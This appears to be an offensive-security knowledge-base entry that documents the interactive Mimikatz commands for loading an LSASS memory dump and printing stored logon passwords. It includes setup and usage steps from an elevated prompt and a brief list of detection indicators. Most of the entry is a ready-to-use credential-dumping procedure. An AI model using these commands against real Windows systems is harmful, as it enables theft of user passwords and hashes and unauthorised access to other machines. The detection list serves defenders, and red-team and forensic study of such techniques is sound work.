---
type: code
language: cmd
verified: true
created_at: '2024-01-01T00:00:00Z'
updated_at: '2024-01-01T00:00:00Z'
platforms:
  - Windows
tags:
  - mimikatz
  - credential-dumping
  - interactive
validated: true
---

# Mimikatz-Interactive-Minidump-Logon-Password-Extraction

## Code

```cmd
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```

## Description

This code snippet provides the interactive commands to be entered at the Mimikatz prompt for loading a LSASS memory dump and extracting logon passwords. It is useful for manual sessions where step-by-step verification is needed, such as during red team operations or forensic analysis.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| lsass.dmp | The path to the memory dump file generated from LSASS | lsass.dmp |

## Usage

Start Mimikatz by running `mimikatz.exe` from an elevated command prompt to enter the interactive shell. At the `mimikatz #` prompt, first execute `sekurlsa::minidump <dumpfile>` to load the dump into memory. Then run `sekurlsa::logonpasswords` to retrieve and display credentials. Exit with `exit` or `quit`. This method allows pausing to review output or chain additional Mimikatz modules.

## Detection

- Execution of mimikatz.exe with debug privileges.
- File access to .dmp files by Mimikatz.
- Behavioral detection of memory scraping or credential API calls via EDR.
- Sysmon events for process injection or unusual LSASS interactions.

## Related

- [[procedures/Mimikatz-Mini-Dump-Password-Extraction]]
- [[tools/Mimikatz]]
